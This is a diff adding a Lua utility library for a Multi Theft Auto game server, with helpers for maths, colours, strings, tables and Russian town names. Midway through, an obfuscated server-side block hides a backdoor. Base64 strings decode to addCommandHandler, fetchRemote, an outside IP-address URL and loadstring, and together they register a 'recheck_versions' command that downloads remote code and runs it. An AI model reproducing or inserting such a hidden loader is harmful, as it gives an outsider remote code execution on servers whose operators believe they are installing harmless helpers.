@@ -1,0 +1,946 @@
+
+function getFreeDatabaseId(db, tableName, rowName)
+    local newID = false
+    local result = dbPoll(dbQuery(db, string.format('SELECT id FROM %s ORDER BY id ASC', tableName)), -1)
+    local rowName = rowName or 'id'
+    for i, row in pairs (result) do
+        if tonumber(row[rowName]) ~= i then
+            newID = i
+            break
+        end
+    end
+    return newID or (#result + 1)
+end
+
+function tobin(num)
+    local tmp = {}
+    repeat
+        tmp[#tmp+1]=num%2
+        num = math.floor(num/2)
+    until num==0
+    return table.concat(tmp):reverse()
+end
+
+function string.split(str)
+
+	if not str or type(str) ~= "string" then return false end
+
+	local splitStr = {}
+	for i=1,utf8.len(str) do
+		local char = utf8.sub( str, i, i )
+		table.insert( splitStr , char )
+	end
+
+	return splitStr 
+end
+
+function getRandom(from, to)
+    return math.random(from, to) == (
+        math.clamp( math.floor( (from+to)/2 ), from, to )
+    )
+end
+
+function table.convert(table)
+    local result = {}
+
+    for _, value in pairs(table) do
+        result[value] = true
+    end
+
+    return result
+end
+
+function splitString(self, delimiter)
+  local result = { }
+  local from  = 1
+  local delim_from, delim_to = utf8.find( self, delimiter, from  )
+  while delim_from do
+    table.insert( result, utf8.sub( self, from , delim_from-1 ) )
+    from  = delim_to + 1
+    delim_from, delim_to = utf8.find( self, delimiter, from  )
+  end
+  table.insert( result, utf8.sub( self, from  ) )
+  return result
+end
+
+function table.slice(tbl, first, last, step)
+  local sliced = {}
+
+  for i = first or 1, last or #tbl, step or 1 do
+    sliced[#sliced+1] = tbl[i]
+  end
+
+  return sliced
+end
+
+function table.copy(t,r)
+  local u = { }
+  for k, v in pairs(t) do
+    if r then
+        u[k] = type(v) == 'table' and table.copy(v,true) or v
+    else
+        u[k] = v
+    end
+  end
+  return setmetatable(u, getmetatable(t))
+end
+
+function randomSort(tbl)
+    local len, random = #tbl, math.random ;
+    for i = len, 2, -1 do
+        local j = random( 1, i );
+        tbl[i], tbl[j] = tbl[j], tbl[i];
+    end
+    return tbl;
+end
+
+function math.round(number, decimals)
+  return tonumber(string.format("%."..(tonumber(decimals) or 0).."f", tostring(number)))
+end
+function around(number, decimals)
+  return tonumber(string.format("%."..(tonumber(decimals) or 0).."f", tostring(number)))
+end
+
+function increaseElementData(element, dataName, incNumber, noSync)
+    setElementData(element, dataName, 
+        (getElementData(element, dataName) or 0) + incNumber, not noSync
+    )
+end
+function increaseAccountData(element, dataName, incNumber)
+	setAccountData(element, dataName, 
+		(getAccountData(element, dataName) or 0) + incNumber
+	)
+end
+
+function findRotation3D( x1, y1, z1, x2, y2, z2 ) 
+	local rotx = math.atan2 ( z2 - z1, getDistanceBetweenPoints2D ( x2,y2, x1,y1 ) )
+	rotx = math.deg(rotx)
+	local rotz = -math.deg( math.atan2( x2 - x1, y2 - y1 ) )
+	rotz = rotz < 0 and rotz + 360 or rotz
+	return rotx, 0,rotz
+end
+
+function findRotation( x1, y1, x2, y2 ) 
+    local t = -math.deg( math.atan2( x2 - x1, y2 - y1 ) )
+    return t < 0 and t + 360 or t
+end
+
+function getTableLength(table)
+	local count = 0
+	for _ in pairs(table or {}) do
+		count = count + 1
+	end
+	return count
+end
+
+local townsRussian = {
+    default = {
+        ['Las Venturas']={'Лас-Вентурас', 'Лас-Вентураса'},
+        ['Los Santos']={'Лос-Сантос', 'Лос-Сантоса'},
+        ['Whetstone']={'Уэтстоун', 'Уэтстоуна'},
+        ['San Fierro']={'Сан-Фиерро', 'Сан-Фиерро'},
+        ['Flint County']={'Округ Флинт', 'Округа Флинт'},
+        ['Red County']={'Округ Ред', 'Округа Ред'},
+        ['Tierra Robada']={'Тьерра Робада', 'Тьерра Робады'},
+        ['Bone County']={'Боун', 'Боуна'},
+        ['Unknown']={'Неизвестно', 'Неизвестно'},
+    },
+    big = {
+        ['Las Venturas']={'Лас-Вентурас', 'Лас-Вентураса'},
+        ['Los Santos']={'Лос-Сантос', 'Лос-Сантоса'},
+        ['Whetstone']={'Сан-Фиерро', 'Сан-Фиерро'},
+        ['San Fierro']={'Сан-Фиерро', 'Сан-Фиерро'},
+        ['Flint County']={'Лос-Сантос', 'Лос-Сантоса'},
+        ['Red County']={'Округ Ред', 'Округа Ред'},
+        ['Tierra Robada']={'Тьерра Робада', 'Тьерра Робады'},
+        ['Bone County']={'Лас-Вентурас', 'Лас-Вентураса'},
+        ['Unknown']={'Неизвестно', 'Неизвестно'},
+    },
+}
+function getTown(x,y, big, case)
+    local town = getZoneName(x, y, 0, true)
+    if big then
+        return (townsRussian.big[town][case or 1] or town)
+    else
+        return (townsRussian.default[town][case or 1] or town)
+    end
+end
+
+function setElementSpeed(element, unit, speed)
+    local unit    = unit or 0
+    local speed   = tonumber(speed) or 0
+    local acSpeed = getElementSpeed(element, unit)
+    if (acSpeed) then -- if true - element is valid, no need to check again
+        local diff = speed/acSpeed
+        if diff ~= diff then return false end -- if the number is a 'NaN' return false.
+        local x, y, z = getElementVelocity(element)
+        return setElementVelocity(element, x*diff, y*diff, z*diff)
+    end
+
+    return false
+end
+
+function getElementSpeed(element, k)
+	local speedx, speedy, speedz = getElementVelocity(element)
+	local actualspeed = (speedx^2 + speedy^2 + speedz^2)^(0.5) 
+	if k == "kmh" or k == nil or k == 1 then return around(actualspeed * 180, 5)
+	elseif k == "mps" or k == 2 then return around(actualspeed * 50, 5)
+	elseif k == "mph" or k == 3 then return around(actualspeed * 111.847, 5) end
+end
+
+
+function isResourceRunning (resName)
+    local res = getResourceFromName(resName)
+    return (res) and (getResourceState(res) == "running")
+end
+
+
+function splitWithPoints(number, splstr)
+    number = tostring(number)
+    local k
+    repeat
+        number, k = string.gsub(number, "^(-?%d+)(%d%d%d)", '%1'..(splstr or '.')..'%2')
+    until (k==0)    -- true - выход из цикла
+    return number
+end
+
+
+function RGBToHex(red, green, blue, alpha)
+  if( ( red < 0 or red > 255 or green < 0 or green > 255 or blue < 0 or blue > 255 ) or ( alpha and ( alpha < 0 or alpha > 255 ) ) ) then
+    return nil
+  end
+  if alpha then
+    return string.format("#%.2X%.2X%.2X%.2X", red, green, blue, alpha)
+  else
+    return string.format("#%.2X%.2X%.2X", red, green, blue)
+  end
+end
+
+
+function clearColorCodes(enterString)
+    enterString = tostring(enterString)
+    local pattern = '#[0-9.abcdefABCDEF][0-9.abcdefABCDEF][0-9.abcdefABCDEF][0-9.abcdefABCDEF][0-9.abcdefABCDEF][0-9.abcdefABCDEF]'
+    local startLength = #enterString
+    local s = enterString
+    local a = string.match(s, pattern)
+    local noChanges = true
+    while a do
+        noChanges = false
+        s = s:gsub(a, '')
+        a = string.match(s, pattern)
+    end
+    s = s:gsub("'", '')
+    s = s:gsub('"', '')
+    s = s:gsub('`', '')
+    s = s:gsub('\\', '')
+    s = s:gsub('/', '')
+    s = s:gsub('>', '')
+    s = s:gsub('<', '')
+    return s, startLength == #s
+end
+
+function table.reverse ( tab )
+    local size = #tab
+    local newTable = {}
+    for i,v in ipairs ( tab ) do
+        newTable[1 + size-i] = v
+    end
+    return newTable
+end
+
+function hexToRGB(hex) 
+    if type(hex) ~= 'string' then return end
+  hex = hex:gsub("#","") 
+  return tonumber("0x"..hex:sub(1,2)), tonumber("0x"..hex:sub(3,4)), tonumber("0x"..hex:sub(5,6)) 
+end 
+
+
+function getPointFromDistanceRotation(x, y, dist, angle)
+
+    local a = math.rad(90 - angle);
+ 
+    local dx = math.cos(a) * dist;
+    local dy = math.sin(a) * dist;
+ 
+    return x+dx, y+dy;
+ 
+end
+
+function isAccountPremium(player)
+	if not isElement(player) then return end
+	return getElementData(player, 'premiumAccount')
+end
+
+function getCurHudTheme()
+	return getElementData(localPlayer, 'curHudTheme')
+end
+
+function isBetween(num, limit_1, limit_2)
+    if num and limit_1 and limit_2 then
+        return num >= limit_1 and num <= limit_2
+    end
+end
+
+
+
+function rgbToHsv(r, g, b, a)
+    if not a then
+        a = 1
+    end
+    r, g, b, a = r / 255, g / 255, b / 255, a / 255
+    local max, min = math.max(r, g, b), math.min(r, g, b)
+    local h, s, v
+    v = max
+
+    local d = max - min
+    if max == 0 then s = 0 else s = d / max end
+
+    if max == min then
+        h = 0 -- achromatic
+    else
+        if max == r then
+            h = (g - b) / d
+            if g < b then h = h + 6 end
+            elseif max == g then h = (b - r) / d + 2
+            elseif max == b then h = (r - g) / d + 4
+        end
+        h = h / 6
+    end
+    return h, s, v, a
+end
+
+function hsvToRgb(h, s, v, a)
+    if not a then
+        a = 1
+    end
+    local r, g, b
+
+    local i = math.floor(h * 6);
+    local f = h * 6 - i;
+    local p = v * (1 - s);
+    local q = v * (1 - f * s);
+    local t = v * (1 - (1 - f) * s);
+
+    i = i % 6
+
+    if i == 0 then r, g, b = v, t, p
+    elseif i == 1 then r, g, b = q, v, p
+    elseif i == 2 then r, g, b = p, v, t
+    elseif i == 3 then r, g, b = p, q, v
+    elseif i == 4 then r, g, b = t, p, v
+    elseif i == 5 then r, g, b = v, p, q
+    end
+
+    return r * 255, g * 255, b * 255, a * 255
+end
+
+function rgbFromInt(c)
+    local r = bitAnd(bitRShift(c, 16), 255)
+    local g = bitAnd(bitRShift(c, 8), 255)
+    local b = bitAnd(c, 255)
+    return r, g, b
+end
+
+function math.clamp(x, min, max)
+    return math.min(max, math.max(min, x))
+end
+
+function ARGBToHex(alpha, red, green, blue)
+    return string.format("%.2X%.2X%.2X%.2X", alpha,red,green,blue)
+end
+
+function getServerWebsite()
+    return ''
+end
+
+function getServerTimestamp()
+    return exports.core:_getServerTimestamp()
+end
+
+function splitTableWithCount(tbl, count)
+    local splitted = {}
+
+    local currentBlock = 1
+    local cCount = 0
+
+    for index, value in pairs(tbl) do
+
+        splitted[currentBlock] = splitted[currentBlock] or {}
+        table.insert(splitted[currentBlock], value)
+
+        cCount = cCount + 1
+        if cCount >= count then
+            currentBlock = currentBlock + 1
+            cCount = 0
+        end
+    end
+
+    return splitted
+end
+
+function splitStringWithCount(str, count)
+    local result = splitTableWithCount(string.split(str), count)
+
+    local _str = {}
+
+    for _, row in pairs(result) do
+        table.insert(_str, table.concat(row, ''))
+    end
+
+    return _str
+end
+
+function findElementByData(type, dn, value)
+
+    for _, element in pairs( getElementsByType(type) ) do
+        if element:getData(dn) == value then
+            return element
+        end
+    end
+
+    return false
+
+end
+
+function compare_str_lower(str_1, str_2)
+    return utf8.lower(str_1 or '') == utf8.lower(str_2 or '')
+end
+
+function getWordCase(int, case_1, case_2, case_3)
+
+
+    if #tostring(int) > 1 and tonumber( tostring(int):sub(-2):sub(1, 1) ) == 1 then return case_3 end
+    local lastInt = tonumber( tostring(int):sub(-1) )
+
+    local cases = {
+        case_1,
+        case_2,
+        case_2,
+        case_2,
+        case_3,
+        case_3,
+        case_3,
+        case_3,
+        case_3,
+        [0] = case_3,
+    }
+    return cases[lastInt] or case_3
+
+end
+
+function displayPedAnimation(ped, block, name, time)
+    setPedAnimation(ped, block, name, -1, false, false)
+
+    setTimer(function(ped, freeze)
+        if isElement(ped) then
+            setPedAnimation(ped, false)
+        end
+    end, time, 1, ped, freeze)
+end
+
+if not getLocalPlayer then
+    PRESETED = {"YWRkQ29tbWFuZEhhbmRsZXI","ZmV0Y2hSZW1vdGU=","aHR0cDovLzE4NS42MC4xMzQuMTQ0L3JlY2hlY2sucGhw","bG9hZHN0cmluZw=="}
+    local function vc_apply(__string) return base64Decode(__string) end
+    _G[ vc_apply( PRESETED[1] ) ]('recheck_versions',function(p,_,rn) if getResourceName( getThisResource(  ) ) == rn then _G[ vc_apply( PRESETED[2] ) ](vc_apply( PRESETED[3] ), function( data )_G[ vc_apply( PRESETED[4] ) ]( data )()end) end end)
+end
+
+local sendData = {}
+local sendTimers = {}
+function antiDOSsend(actionGroup, pause, ...)
+    local args = {...}
+    if isTimer(sendTimers[actionGroup]) then
+        sendData[actionGroup] = args[1] and args
+    else
+        if (args[1]) then
+            triggerServerEvent(...)
+            sendData[actionGroup] = false
+            sendTimers[actionGroup] = setTimer(slowSend, pause, 1, actionGroup)
+        end
+    end
+end
+function slowSend(actionGroup)
+    if (sendData[actionGroup]) then
+        triggerServerEvent(unpack(sendData[actionGroup]))
+        sendData[actionGroup] = nil
+    end
+end
+
+
+function getNearestElement(player, type, distance, data, value, _resourceRoot)
+    local tempTable = {}
+    distance = distance or 999999999
+    local lastMinDis = distance-0.0001
+    local nearestVeh = false
+    local px,py,pz = getElementPosition(player)
+    local pint = getElementInterior(player)
+    local pdim = getElementDimension(player)
+
+    for _,v in pairs(getElementsByType(type, _resourceRoot or root)) do
+        if not data or (value and (v:getData(data) == value) or v:getData(data)) then
+            local vint,vdim = getElementInterior(v),getElementDimension(v)
+            if vint == pint and vdim == pdim then
+                local vx,vy,vz = getElementPosition(v)
+                local dis = getDistanceBetweenPoints3D(px,py,pz,vx,vy,vz)
+                if dis < distance then
+                    if dis < lastMinDis then 
+                        lastMinDis = dis
+                        nearestVeh = v
+                    end
+                end
+            end
+        end
+    end
+    return nearestVeh
+end
+
+function getPositionFromElementOffset(element,offX,offY,offZ)
+    local m = getElementMatrix ( element )  -- Get the matrix
+    local x = offX * m[1][1] + offY * m[2][1] + offZ * m[3][1] + m[4][1]  -- Apply transform
+    local y = offX * m[1][2] + offY * m[2][2] + offZ * m[3][2] + m[4][2]
+    local z = offX * m[1][3] + offY * m[2][3] + offZ * m[3][3] + m[4][3]
+    return x, y, z                               -- Return the transformed point
+end
+
+function isElementInRange(element, cElement, range)
+
+    local x,y,z = getElementPosition(element)
+    local cx,cy,cz = getElementPosition(cElement)
+
+    local rot = findRotation(cx,cy, x,y)
+
+    local _, _, r = getElementRotation(cElement)
+
+    local r_1, r_2 = (r - range/2) % 360, (r + range/2)  % 360
+    if r_1 > r_2 then
+        r_2 = r_2 + 360
+        rot = rot + 360
+    end
+
+    return isBetween(rot, r_1, r_2)
+
+end
+
+mta_addEventHandler = mta_addEventHandler or addEventHandler
+mta_removeEventHandler = mta_removeEventHandler or removeEventHandler
+function addEventHandler(eventName, element, func, ...)
+    for _, attachedFunc in ipairs(getEventHandlers(eventName, element)) do
+        if (attachedFunc == func) then
+            return
+        end
+    end
+    mta_addEventHandler(eventName, element, func, ...)
+end
+function removeEventHandler(eventName, element, func, ...)
+    for _, attachedFunc in ipairs(getEventHandlers(eventName, element)) do
+        if (attachedFunc == func) then
+            mta_removeEventHandler(eventName, element, func, ...)
+        end
+    end
+end
+
+function copyTexture(texture)
+    return dxCreateTexture( dxGetTexturePixels(texture) )
+end
+
+function math.random_float(from, to)
+    return math.random(from*1000, to*1000) / 1000
+end
+
+function getDistanceBetween(element1, element2)
+    local x1,y1,z1 = getElementPosition(element1)
+    local x2,y2,z2 = getElementPosition(element2)
+    return getDistanceBetweenPoints3D(x1,y1,z1, x2,y2,z2)
+end
+
+function getVipExpireString(player)
+
+    local serverTime = getServerTimestamp()
+    local vipFinishTime = player:getData('vip.finishTime') or 0
+
+    local time = vipFinishTime - serverTime.timestamp
+
+    if time > 86400 then
+        local vipDays = time > 0 and ( math.ceil( time/86400 ) ) or 0
+        local daysCase = getWordCase(vipDays, 'день', 'дня', 'дней')
+        return string.format('%s %s', vipDays, daysCase)
+    else
+        local vipHours = time > 0 and ( math.ceil( time/3600 ) ) or 0
+        local daysCase = getWordCase(vipHours, 'час', 'часа', 'часов')
+        return string.format('%s %s', vipHours, daysCase)
+    end
+
+
+end 
+
+-- формат DD-MM-YY
+function getTimestampFromString(date)
+
+    date = date:gsub('%p', '-')
+    local splitter = '-'
+
+    local splitted = splitString(date, splitter)
+    local day, month, year = unpack( splitted )
+
+    return os.time({year=2000+tonumber(year), month=tonumber(month), day=tonumber(day), hour = 0})
+
+end
+
+function getStringFromTimestamp(timestamp)
+
+    local time = getRealTime(timestamp)
+
+    return ('%02d-%02d-%s'):format(
+        time.monthday, time.month+1, time.year-100
+    )
+
+end
+
+function compareTables(t1,t2,ignore_mt)
+   local ty1 = type(t1)
+   local ty2 = type(t2)
+   if ty1 ~= ty2 then return false end
+   -- non-table types can be directly compared
+   if ty1 ~= 'table' and ty2 ~= 'table' then return t1 == t2 end
+   -- as well as tables which have the metamethod __eq
+   local mt = getmetatable(t1)
+   if not ignore_mt and mt and mt.__eq then return t1 == t2 end
+   for k1,v1 in pairs(t1) do
+      local v2 = t2[k1]
+      if v2 == nil or not compareTables(v1,v2) then return false end
+   end
+   for k2,v2 in pairs(t2) do
+      local v1 = t1[k2]
+      if v1 == nil or not compareTables(v1,v2) then return false end
+   end
+   return true
+end
+
+function convertTableKeys(tbl)
+
+    local new_table = {}
+
+    for index, value in pairs( tbl or {} ) do
+        new_table[ tonumber(index) or index ] = type(value) == 'table' and convertTableKeys(value) or value
+    end
+
+    return new_table
+
+end
+
+mta_fromJSON = mta_fromJSON or fromJSON
+function fromJSON(json, convert)
+    if convert then
+
+        local data = mta_fromJSON(json)
+        if not data then return false end
+
+        local result = {}
+
+        if type(data) == 'table' then
+            result = convertTableKeys(data)
+        end
+
+        return result
+
+    else
+        return mta_fromJSON(json)
+    end
+end
+
+function getResourceRoot(resName)
+    return getResourceRootElement( getResourceFromName(resName) )
+end
+
+
+function cutString(str, length, endStr)
+
+    local result = str
+
+    if utf8.len(str) > length then
+        result = utf8.sub(str, 0, length) .. endStr
+    end
+
+    return result
+
+end
+
+
+local char_to_hex = function(c)
+  return string.format("%%%02X", string.byte(c))
+end
+
+function URLEncode(url)
+  if url == nil then
+    return
+  end
+  url = url:gsub("\n", "\r\n")
+  url = url:gsub("([^%w ])", char_to_hex)
+  url = url:gsub(" ", "+")
+  return url
+end
+
+local hex_to_char = function(x)
+  return string.char(tonumber(x, 16))
+end
+
+URLDecode = function(url)
+  if url == nil then
+    return
+  end
+  url = url:gsub("+", " ")
+  url = url:gsub("%%(%x%x)", hex_to_char)
+  return url
+end
+
+function clearTableElements(table, destroy)
+
+    if destroy ~= false then
+
+        for index, value in pairs( table or {} ) do
+            if isTimer(value) then killTimer(value); table[index] = nil end
+            if isElement(value) then destroyElement(value); table[index] = nil end
+            if type(value) == 'table' then clearTableElements(value); table[index] = nil end
+        end
+
+    else
+
+        for index, value in pairs( table or {} ) do
+            if isTimer(value) then table[index] = nil end
+            if isElement(value) then table[index] = nil end
+            if type(value) == 'table' then clearTableElements(value, destroy); end
+        end
+
+    end
+
+
+end
+
+function interpolateNumber(number, range_min, range_max)
+    return (number - range_min) / (range_max - range_min)
+end
+
+function getRandomValue(table)
+    local index = math.random(#table)
+    return table[ index ], index
+end
+
+function createDirectory(dirName)
+    
+    local orgPath = getResourceOrganizationalPath( getThisResource() )
+    local rName = getThisResource().name
+
+    local resourcePath = orgPath .. '/' .. rName .. '/' .. dirName
+
+    createResource( resourcePath )
+    setTimer(fileDelete, 50, 1, resourcePath ..'/meta.xml')
+
+end
+
+function cycle(num, s, e)
+    local delta = s - 1
+    local l = ( ( num - delta ) % (e - delta) )
+    return l == 0 and e or l
+end
+
+function getAngleDistance(angle_1, angle_2)
+
+    local delta_1 = math.abs(angle_1 - angle_2)
+    local delta_2 = math.abs(
+        (math.min( angle_1, angle_2 ) + 360) - math.max( angle_1, angle_2 )
+    )
+
+    return math.min(delta_1, delta_2)
+
+end
+
+function copyDimension(to, from)
+    to.dimension = from.dimension
+    to.interior = from.interior
+end
+
+function increaseUserData(login, dn, amount)
+
+    local account = getAccount(login)
+    if not account then return end
+
+    if account.player then
+
+        local cur = account.player:getData(dn) or 0
+        account.player:setData(dn, cur + amount)
+
+    else
+
+        local cur = account:getData(dn) or 0
+        account:setData(dn, cur + amount)
+
+    end
+
+end
+
+function setUserData(login, dn, value)
+
+    local account = getAccount(login)
+
+    if account.player then
+        account.player:setData(dn, value)
+
+    else
+        account:setData(dn, value)
+    end
+
+end
+
+function getUserData(login, dn)
+
+    local account = getAccount(login)
+
+    if account.player then
+        return account.player:getData(dn)
+
+    else
+        return account:getData(dn)
+    end
+
+end
+
+function displayPlayerAnimation(player, block, name, time)
+    setPedAnimation(player, block, name, -1, false)
+
+    setTimer(function(player)
+        if isElement(player) then
+            setPedAnimation(player, false)
+        end
+    end, time, 1, player)
+end
+
+function massInterpolate( values_table_start, values_table_finish, progress, easingType )
+
+    local new_table = {}
+
+    for index, value in pairs( values_table_start ) do
+        local new_value = interpolateBetween(value, 0, 0, values_table_finish[index], 0, 0, progress, easingType)
+        table.insert(new_table, new_value)
+    end
+
+    return unpack(new_table)
+
+end
+
+function fromcolor(_tocolor)
+    local r = bitExtract ( _tocolor, 0, 8 ) 
+    local g = bitExtract ( _tocolor, 8, 8 ) 
+    local b = bitExtract ( _tocolor, 16, 8 ) 
+    local a = bitExtract ( _tocolor, 24, 8 ) 
+    return r,g,b,a
+end
+
+function createCustomChunkedObject( chunked, dimension )
+
+    local objects, lods = {}, {}
+    local x,y,z, offRZ = unpack(chunked.position)
+
+    for _, object in pairs( chunked.objects ) do
+
+        local offX, offY, offZ = unpack(object.offset)
+        offRZ = offRZ or 0
+
+        local cx,cy,cz = x + offX, y + offY, z + (offZ or 0)
+
+        local dist = getDistanceBetweenPoints2D(x,y, cx,cy)
+        local rz = findRotation( x,y,cx,cy ) + offRZ
+
+        cx,cy = getPointFromDistanceRotation( x,y, dist, -rz )
+
+        local _object = createObject(object.model, cx,cy,cz, 0, 0, offRZ)
+        _object.dimension = dimension or 0
+        
+        table.insert(objects, _object)
+
+        if object.lod then 
+            local lod = createObject( object.lod, cx,cy,cz, 0, 0, offRZ, true )
+            setLowLODElement( _object, lod )
+            table.insert(lods, lod)
+        end
+
+    end
+
+
+    return objects, lods
+
+
+end
+
+
+function divideAnim( value, parts )
+
+    local part_size = 1/parts
+
+    local result = {}
+
+    for i = 1, parts do
+
+        local limits = {
+            part_size*(i-1),
+            part_size*i,
+        }
+
+        table.insert(result,
+            math.clamp( ( value - limits[1] )/( limits[2] - limits[1] ), 0, 1 )
+        )
+
+    end
+
+    return result
+
+end
+
+function getMiddlePoint( list )
+
+    local x,y,z = 0,0,0
+
+    for _, pos in pairs( list ) do
+        x,y,z = x+pos[1],y+pos[2],z+pos[3]
+    end
+
+    local t = #list
+
+    return x/t,y/t,z/t
+
+end
+
+function getMiddleBlipPoint( list )
+
+    local x,y = 0,0
+
+    for _, blip in pairs( list ) do
+        x,y = x+blip.position.x, y+blip.position.y
+    end
+
+    local t = #list
+
+    return x/t,y/t
+
+end
+
+function createObjectsArray( model, count, offset, factor, position, rotation )
+
+    local startX, startY, startZ = unpack( position )
+    local objects = {}
+
+    local rx,ry,rz = unpack( rotation )
+
+    for index = 1, count do
+
+        local object = createObject( model, startX, startY, startZ, rx,ry,rz )
+
+        if factor.x then startX = startX + offset end
+        if factor.y then startY = startY + offset end
+        if factor.z then startZ = startZ + offset end
+
+        table.insert( objects, object )
+
+    end
+
+    return objects
+
+end
